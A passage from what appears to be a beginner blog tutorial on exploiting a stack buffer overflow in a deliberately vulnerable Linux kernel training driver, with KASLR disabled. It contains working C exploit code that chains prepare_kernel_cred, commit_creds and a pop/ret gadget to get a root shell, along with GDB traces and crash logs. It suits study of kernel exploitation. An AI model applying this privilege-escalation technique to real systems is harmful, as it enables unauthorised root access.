|                        |
|  Function A Variables  |
|                        |
|                        |
|                        |
+------------------------+ Base of the stack
|                        | (Base pointer)
|                        |
|    ...                 |
|                        |
|                        |
+------------------------+Higher addresses
</code></pre><p>Here we see the stack during the execution of some A function. Let&rsquo;s supose now that the A function calls a B function. The following should happen:</p>
<ul>
<li>The A function call instruction should push the return address into the stack so when B executes the RET instruction, it pops the return address from memory and sets the instruction pointer register to it.</li>
<li>The B function should push the base pointer into the stack so it can be restored upon return.</li>
</ul>
<p>The stack should look like this:</p>
<pre><code>+------------------------+ Lower addresses
|                        |
|                        |
|                        |
|                        |
|                        |
+------------------------+Top of stack
|                        |
|  Function B Variables  |
|                        |
+------------------------+Base of stack
|  Previous base pointer |
+------------------------+
|  Return address of A   |
+------------------------+
|                        |
|                        |
|                        |
|  Function A Variables  |
|                        |
|                        |
|                        |
+------------------------+
|                        |
|                        |
|    ...                 |
|                        |
|                        |
+------------------------+Higher addresses
</code></pre><p>So say there&rsquo;s a stack overflow in B. If the overflow is large enough, the attacker should be able to overwrite the previous base pointer and, more interestingly, the return address.</p>
<p>By overwriting the return address, when function B executes the RET instruction, instead of returning to A, the flow will be redirected to wherever the overwritten address controlled by the attacker points to, causing a flow hijack.</p>
<p>Time to get our hands dirty!</p>
<h3 id="writing-our-exploit">Writing our exploit</h3>
<p>First things first. Let&rsquo;s make sure that our driver is loaded.</p>
<pre><code>[root@archlinux src]# insmod vuln_driver.ko
[68216.283511] [!!!] use_stack_obj @00000000bcfc15f3 [!!!]
[root@archlinux src]# ls /dev/vulnerable_device -lah
crw-rw-rw- 1 root root 10, 61 Apr 28 14:04 /dev/vulnerable_device
[root@archlinux src]# su guest
[guest@archlinux src]$
</code></pre><p>I inserted the module, made sure any user could write to or read from it (in /dev/vulnerable_device) and changed the user to an unprivileged one named guest. Let the fun begin!</p>
<p>Let&rsquo;s write our first code which will simply overflow the buffer:</p>
<pre><code>#include &lt;sys/ioctl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;../src/vuln_driver.h&quot;
#include &lt;sys/types.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;

#define BUF_LEN 512

#define PAYLOAD_LEN BUF_LEN + 100

int main()
{
    //Opening the vulnerable device
    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
    //Payload is set do A's
    char payload[PAYLOAD_LEN+1];
    memset(payload, 'A', PAYLOAD_LEN);
    payload[PAYLOAD_LEN] = '\0';
    //Sending payload to overflow function
    ioctl(fd, BUFFER_OVERFLOW, payload);
    //Releasing the device's FD.
    close(fd);
}
</code></pre><p>All this does is send 612 bytes to the driver buffer (which is allocated to fit only 512 bytes). When we run our exploit, this is what we get:</p>
<pre><code>[guest@archlinux exploits]$ ./exploit
[74193.913369] [x] Triggering buffer overflow of size 612 [x]
[74193.914320] general protection fault: 0000 [#11] SMP PTI
[74193.914798] CPU: 0 PID: 1782 Comm: exploit Tainted: G      D    O      5.6.0+ #3
[74193.915452] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20191223_100556-anatol 04/01/2014
[74193.916307] RIP: 0010:buffer_overflow+0x5c/0x5d [vuln_driver]
[74193.916816] Code: 89 e0 48 89 c7 f3 a4 48 c7 c7 a0 10 00 c0 0f be b4 24 ff 01 00 00 e8 79 cb 0b c1 48 31 ff 48 81 7
[74193.918446] RSP: 0018:ffffc900002f3ed8 EFLAGS: 00010246
[74193.918904] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000000000000
[74193.919524] RDX: 0000000000000000 RSI: ffff88813bc18968 RDI: 0000000000000000
[74193.920144] RBP: 00007fffb1227e90 R08: ffffc900002f3b8d R09: 00000000000003bc
[74193.920765] R10: ffffc900002f3b88 R11: ffffc900002f3b8d R12: 4141414141414141
[74193.921385] R13: 00007fffb1227e90 R14: 0000000000000003 R15: ffff88813a18ef00
[74193.922014] FS:  00007f686d798540(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[74193.922715] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[74193.923216] CR2: 00007f686d7961b8 CR3: 00000001375a2000 CR4: 00000000000006f0
[74193.923841] Call Trace:
[74193.924065]  ? __x64_sys_ioctl+0x11/0x20
[74193.924414]  ? do_syscall_64+0x43/0x140
[74193.924753]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[74193.925222] Modules linked in: vuln_driver(O) [last unloaded: vuln_driver]
[74193.925870] ---[ end trace 37a63e690f3d98d4 ]---
[74193.926385] RIP: 0010:0x3
[74193.926719] Code: Bad RIP value.
[74193.927022] RSP: 0018:ffffc90000343ef0 EFLAGS: 00010246
[74193.927633] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000000000000
[74193.928429] RDX: 0000000000000000 RSI: ffffffff82445440 RDI: ffff88813742dcc0
[74193.929221] RBP: 000055af0edbc2b0 R08: ffff88813bc2d3a0 R09: ffff8881377c3b20
[74193.929946] R10: 0000000000000400 R11: 00000000000d0800 R12: 4242424242424242
[74193.930588] R13: 000055af0edbc2b0 R14: 0000000000000003 R15: ffff88813b0c1000
[74193.931214] FS:  00007f686d798540(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[74193.931937] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[74193.932548] CR2: ffffffffffffffd9 CR3: 00000001375a2000 CR4: 00000000000006f0
Segmentation fault

</code></pre><p>Now, remember: we are trying to hijack the flow of the kernel module. To do that, we must overwrite the return address. It should be 16 bytes after the end of the buffer, since there are 8 bytes for the size variable and 8 bytes for the base pointer. Our payload is:</p>
<p><code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [ADDRESS TO WHERE WE WISH TO HIJACK]</code></p>
<p>To test this hypothesis, we could put the address of a function we know by the and of our payload and set a breakpoint in that function. If the breakpoint is hit, we should be certain that we are in the right path.</p>
<p>The function I&rsquo;m going to choose to do this test is the prepare_kernel_cred function. We could have chosen at this point any function within the kernel, however I have chosen this one just because we&rsquo;re actually going to use it in the following section.</p>
<p>So I&rsquo;ll pause the kernel in GDB and add the breakpoint:</p>
<pre><code>(gdb) b *prepare_kernel_cred
Breakpoint 5 at 0xffffffff8108e260: file kernel/cred.c, line 684.
(gdb)
</code></pre><p>Not only we put the breakpoint, but we find out that the address for that function is <code>0xffffffff8108e260</code>. The address was found using GDB, but in real life this is usually not possible. KASLR is also disabled in this environment, which is pretty unrealistic in real scenarios. For this moment, we&rsquo;ll stick with this <em>cheating</em> approach, but in future posts we should dive deeper into developing more robust exploits.</p>
<p>With the address in mind, we modify the exploit to put it by the end of the payload.</p>
<pre><code>#define BUF_LEN 512
#define PADDING 16
#define PAYLOAD_LEN BUF_LEN + PADDING + 8

#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }

int main()
{
    //Opening the vulnerable device
    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
    //Payload is set do A's
    char payload[PAYLOAD_LEN+1];
    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
    memset(payload, 'A', BUF_LEN + PADDING);
    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, 8);
    payload[PAYLOAD_LEN] = '\0';
    printf(&quot;Payload: %s\n&quot;, payload);
    //Sending payload to overflow function
    ioctl(fd, BUFFER_OVERFLOW, payload);
    //Releasing the device's FD.
    close(fd);
}
</code></pre><p>When the exploit has ran, we notice that it, in fact, DOES hit the breakpoint! That&rsquo;s great news!</p>
<pre><code>(gdb) b *prepare_kernel_cred
Breakpoint 5 at 0xffffffff8108e260: file kernel/cred.c, line 684.
(gdb) c
Continuing.

Breakpoint 5, prepare_kernel_cred (daemon=0x0 &lt;fixed_percpu_data&gt;) at kernel/cred.c:684
684		new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
(gdb)
</code></pre><p>Now we go back to why we chose this function for our test.</p>
<h3 id="finding-a-good-gadget-chain-for-privilege-escalation">Finding a good gadget chain for privilege escalation</h3>
<p>We are able to redirect the flow of execution to wherever we please throughout the kernel. The goal here is to escalate privileges to root. But how do we do that?</p>
<p>In order to find that out, we must first learn how the kernel stores a process&rsquo; credentials.</p>
<p>Every thread in Linux has information stored in a struct named task_struct. According to Linux&rsquo;s own documentation, task_struct holds a pointer to another struct named creds:</p>
<p><code>In Linux, all of a task’s credentials are held in (uid, gid) or through (groups, keys, LSM security) a refcounted structure of type ‘struct cred’. Each task points to its credentials by a pointer called ‘cred’ in its task_struct.</code></p>
<p>(<a href="https://www.kernel.org/doc/html/v4.14/security/credentials.html#types-of-credentials">https://www.kernel.org/doc/html/v4.14/security/credentials.html#types-of-credentials</a>)</p>
<p>In fact, if one executes a <code>ptype struct task_struct</code> on GDB, the attribute is found:</p>
<pre><code>(gdb) ptype struct task_struct
type = struct task_struct {
    struct thread_info thread_info;
    volatile long state;
    void *stack;
(...)
    const struct cred *cred;
(...)


</code></pre><p>We may also check out the cred struct while we are at it:</p>
<pre><code>(gdb) ptype struct cred
type = struct cred {
    atomic_t usage;
    kuid_t uid;
    kgid_t gid;
    kuid_t suid;
    kgid_t sgid;
    kuid_t euid;
    kgid_t egid;
    kuid_t fsuid;
    kgid_t fsgid;
(...)
</code></pre><p>Notice the uid and gid attributes. If they are changed to zero, the process will be executed as root. The values of  <code>euid</code> and <code>egid</code> attributes (effective uid and effective gid) must also be altered for this to work. To our luck, this can be done by calling the <code>commit_creds(struct cred *)</code> function with a valid pointer to a root cred struct. The pointer can be obtained by calling the <code>prepare_kernel_cred(struct *task_struct)</code> with a NULL value to its argument. Hence, the following function call must be made: <code>commit_creds(prepare_kernel_cred(NULL))</code>.</p>
<p>(This is why our example function was prepare_kernel_cred!)</p>
<p>Finally, we must also make sure that after the two functions execute, the stack and the registers will be in a good enough state for the driver to gracefully exit and return to userland without a crash. If we get privilege escalation along with a kernel panic or a program crash, it would all have been for nothing.</p>
<h3 id="crafting-our-payload">Crafting our payload</h3>
<p>So far we managed to redirect the execution flow to the prepare_kernel_cred function. As we hit the breakpoint, we may see the stack state and the registers as soon as we enter the function:</p>
<pre><code>(gdb) info registers
rax            0x0                 0
rbx            0x4141414141414141  4702111234474983745
rcx            0x0                 0
rdx            0x0                 0
rsi            0xffff88813bc18968  -131386342012568
rdi            0x0                 0
rbp            0x7ffdd3e39710      0x7ffdd3e39710
rsp            0xffffc90000313ee0  0xffffc90000313ee0
r8             0xffffc90000313b8d  -60473136301171
r9             0x44f               1103
r10            0xffffc90000313b88  -60473136301176
r11            0xffffc90000313b8d  -60473136301171
r12            0x4141414141414141  4702111234474983745
r13            0x7ffdd3e39710      140728158361360
r14            0x3                 3
r15            0xffff88813a1a0500  -131386369768192
rip            0xffffffff8108e260  0xffffffff8108e260 &lt;prepare_kernel_cred&gt;
</code></pre><pre><code>(gdb) info stack
#0  prepare_kernel_cred (daemon=0x0 &lt;fixed_percpu_data&gt;) at kernel/cred.c:684
#1  0x00007ffdd3e39710 in ?? ()
#2  0x0000000000000003 in fixed_percpu_data ()
#3  0x000000008008fe01 in ?? ()
#4  0xffffffff811ee992 in vfs_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, filp=&lt;optimized out&gt;) at fs/ioctl.c:47
#5  ksys_ioctl (fd=3, cmd=3554907920, arg=140728158361360) at fs/ioctl.c:763
#6  0xffffffff811ee9e1 in __do_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:772
#7  __se_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:770
#8  __x64_sys_ioctl (regs=&lt;optimized out&gt;) at fs/ioctl.c:770
#9  0xffffffff81002883 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc90000313f58) at arch/x86/entry/common.c:295
#10 0xffffffff81c0008c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:175
#11 0x0000000000000000 in ?? ()
</code></pre><p>If you check out the calling convention for x86_64 Linux, you&rsquo;ll see that RDI is used to pass the first argument on a function call. That&rsquo;s great news, since RDI is already zero when the prepare_kernel_cred function is called (and, as you may remember, the parameter needed to be NULL).</p>
<p>You may check the calling convention here: <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions">https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions</a></p>
<p>We see plenty of return addresses in the stack. We must preserve them if we want to avoid a system crash or a kernel oops. Fortunately, we have room to work with before we start messing with these return addresses.</p>
<p>While preserving the return addresses, we should add one address of our own: the commmit_creds address. So our payload will not be:
<code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [PREPARE_KERNEL_CRED] + [COMMIT_CREDS] </code></p>
<p>Since there&rsquo;s no KASLR here, the address for commit_creds can be found by putting a breakpoint into it. As root, one may also get it from /proc/kallsys.</p>
<pre><code> (gdb) b commit_creds
Breakpoint 7 at 0xffffffff8108de20: file ./arch/x86/include/asm/current.h, line 15.
</code></pre><p>So the breakpoint is set. Let&rsquo;s see what happens. Below is the code with the commit_creds address added to it:</p>
<pre><code>#define BUF_LEN 512
#define PADDING 16
#define INTLEN 8
#define PAYLOAD_LEN BUF_LEN + PADDING + INTLEN + INTLEN


#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
#define COMMIT_CREDS_ADDR { 0x20, 0xde, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff}


int main()
{
    //Opening the vulnerable device
    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
    //Payload is set do A's
    char payload[PAYLOAD_LEN+1];
    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
    char commit_creds[] = COMMIT_CREDS_ADDR;
    memset(payload, 'A', BUF_LEN + PADDING);
    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, INTLEN);
    memcpy(payload + BUF_LEN + PADDING + INTLEN, commit_creds, INTLEN);
    payload[PAYLOAD_LEN] = '\0';
    printf(&quot;Payload: %s\n&quot;, payload);
    //Sending payload to overflow function
    ioctl(fd, BUFFER_OVERFLOW, payload);
    //Releasing the device's FD.
    close(fd);
}
</code></pre><p>We run and it hits the first breakpoint in prepare_kernel_creds. As we continue, it hits the second breakpoint in commit_creds. As we print the registers state, we find this:</p>
<pre><code>Breakpoint 7, commit_creds (new=0xffff88813a2dcf00) at ./arch/x86/include/asm/current.h:15
15		return this_cpu_read_stable(current_task);
(gdb) i r
rax            0xffff88813a2dcf00  -131386368471296
rbx            0x4141414141414141  4702111234474983745
rcx            0x0                 0
rdx            0xffff8881375040c0  -131386416545600
rsi            0x0                 0
rdi            0xffff88813a2dcf00  -131386368471296
rbp            0x7ffcdbcdb320      0x7ffcdbcdb320
rsp            0xffffc90000333ee8  0xffffc90000333ee8
r8             0xffff88813bc2d3a0  -131386341928032
r9             0xffff8881375040c0  -131386416545600
r10            0x400               1024
r11            0x5d000             380928
r12            0x4141414141414141  4702111234474983745
r13            0x7ffcdbcdb320      140723996177184
r14            0x3                 3
r15            0xffff88813a193000  -131386369822720
rip            0xffffffff8108de20  0xffffffff8108de20 &lt;commit_creds&gt;
eflags         0x202               [ IOPL=0 IF ]

</code></pre><p>Following the calling convention, the return value of a function is provided in the RAX register. It is very fortunate that RAX is equals to RDI, which means that the argument register has already been set to the credentials pointer somewhere along the way. It seems that we are ready to go!</p>
<p>However, after continuing the program I get a crash.</p>
<p>Running it again and looking at the stack at the moment the commit creds function is called, we notice this:</p>
<pre><code>(gdb) i s
#0  commit_creds (new=0xffff88813a2dcf00) at ./arch/x86/include/asm/current.h:15
#1  0x0000000000000003 in fixed_percpu_data ()
#2  0x000000008008fe01 in ?? ()
#3  0xffffffff811ee992 in vfs_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, filp=&lt;optimized out&gt;) at fs/ioctl.c:47
#4  ksys_ioctl (fd=3, cmd=3687691040, arg=140723996177184) at fs/ioctl.c:763
#5  0xffffffff811ee9e1 in __do_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;)
    at fs/ioctl.c:772
#6  __se_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:770
#7  __x64_sys_ioctl (regs=&lt;optimized out&gt;) at fs/ioctl.c:770
#8  0xffffffff81002883 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc90000333f58) at arch/x86/entry/common.c:295
#9  0xffffffff81c0008c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:175
#10 0x0000000000000000 in ?? ()
</code></pre><p>At #1 and #2, there&rsquo;s garbage for all our purposes, as these are definetly not return addresses. Nevertheless, not everything is lost: the return addresses are intact from #3 onwards. What we have to do is get rid of #1 and #2.</p>
<p>To do that we need to find a gadget which does a stack POP and a RET and put the gadget address on #1. The POP will get rid of #2 and RET will (hopefully) return the flow to normal. There are several ways to look for gadgets. Given the simplicity of this gadget, we should be able find it in any function we search for. A simple disassemble of prepare_kernel_creds itself will sufice:</p>
<pre><code>(...)
   0xffffffff8108e342 &lt;+226&gt;:	pop    %r12
   0xffffffff8108e344 &lt;+228&gt;:	retq
</code></pre><p>Perfect! Just what we needed. So we update our payload:
<code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [PREPARE_KERNEL_CRED] + [COMMIT_CREDS] + [0xffffffff8108e342]</code></p>
<p>Also, we put a <code>system(&quot;/bin/sh&quot;)</code> into the exploit to spawn a shell after privileges are escalated.
Our final exploit looks like this:</p>
<pre><code>#include &lt;sys/ioctl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;../src/vuln_driver.h&quot;
#include &lt;sys/types.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;

#define BUF_LEN 512
#define PADDING 16
#define INTLEN 8
#define PAYLOAD_LEN BUF_LEN + PADDING + INTLEN + INTLEN + INTLEN


#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
#define COMMIT_CREDS_ADDR { 0x20, 0xde, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
#define GADGET { 0x42, 0xe3, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }

int main()
{
    //Opening the vulnerable device
    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
    //Payload is set do A's
    char payload[PAYLOAD_LEN+1];
    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
    char commit_creds[] = COMMIT_CREDS_ADDR;
    char gadget[] = GADGET;
    memset(payload, 'A', BUF_LEN + PADDING);
    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, INTLEN);
    memcpy(payload + BUF_LEN + PADDING + INTLEN, commit_creds, INTLEN);
    memcpy(payload + BUF_LEN + PADDING + INTLEN + INTLEN, gadget, INTLEN);
    payload[PAYLOAD_LEN] = '\0';
    //Sending payload to overflow function
    ioctl(fd, BUFFER_OVERFLOW, payload);
    //Releasing the device's FD.
    close(fd);
    system(&quot;/bin/sh&quot;);
}
</code></pre><p>If everything goes according to plan, it should redirect the exploit&rsquo;s flow to prepare_kernel_cred, then commit the creds generated, do some cleaning up and returning normally to userland.</p>
<p>And the result is:</p>
<pre><code>[guest@archlinux exploits]$ id
uid=1000(guest) gid=1000(guest) groups=1000(guest)
[guest@archlinux exploits]$ ./exploit
[75008.865785] [x] Triggering buffer overflow of size 552 [x]
[75008.866893] VFS: Close: file count is 0
sh-5.0# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><h3 id="conclusion">Conclusion</h3>
<p>We exploited a stack overflow vulnerability with KASLR disabled on Kernel 5.18. We have seen in this post how the kernel stores the task&rsquo;s credentials and one way to change it to escalate privileges. I hope this was a useful example of kernel exploitation for beginners. In future work we will cover how to exploit other vulnerabilities as well as bypassing the KALSR mitigations. Thanks for reading =)</p>
]]></content>
		</item>
		
	</channel>
</rss>
